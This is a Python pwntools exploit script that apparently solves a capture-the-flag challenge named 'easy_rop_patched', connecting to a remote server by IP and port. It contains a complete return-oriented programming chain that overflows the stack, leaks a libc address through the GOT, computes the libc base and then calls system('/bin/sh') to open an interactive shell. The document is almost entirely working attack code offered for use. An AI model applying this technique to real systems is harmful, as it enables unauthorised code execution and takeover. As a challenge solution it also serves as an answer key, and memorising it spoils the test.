from pwn import *

exe = ELF("./easy_rop_patched", checksec=False)
libc = ELF("./libc.so.6", checksec=False)
ld = ELF("./ld-linux-x86-64.so.2", checksec=False)
context.binary = exe

if args.LOCAL:
    p = process([exe.path])
else:
    p = remote("74.207.229.59", 20222)

def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
            b*main+32
            b*main+35
            c
            ''')

rw_section = 0x404600
libc_start_main_got = 0x0000000000403FC8
read = 0x000000000040110A
main = 0x0000000000401106

syscall_pop_rbp = 0x0000000000401126 
pop_rdi_rbp = 0x000000000040112e 

# Make writev function
payload = b'a'*0x20
payload += flat(
    rw_section + 0x20, # saved rbp
    read, # saved rip
    rw_section,
    pop_rdi_rbp,
    1,
    0,
    syscall_pop_rbp,
    b'a'*8, # rbp
    main
    )
payload = payload.ljust(0x80, b'a')
p.send(payload)

# 0x80*0x10
payload = p64(libc_start_main_got) + p64(0x8)
payload = payload.ljust(0x14, b'\0')
p.send(payload)

# Leak libc
libc_leak = u64(p.recv(8))
print("Libc leak: " + hex(libc_leak))
libc.address = libc_leak - 0x2a3f0
print("Libc base: " + hex(libc.address))

# Get shell
# GDB()
payload = flat(
    b'a'*0x28,
    pop_rdi_rbp,
    next(libc.search(b'/bin/sh')),
    0,
    libc.sym.system
    )
p.send(payload)

p.interactive()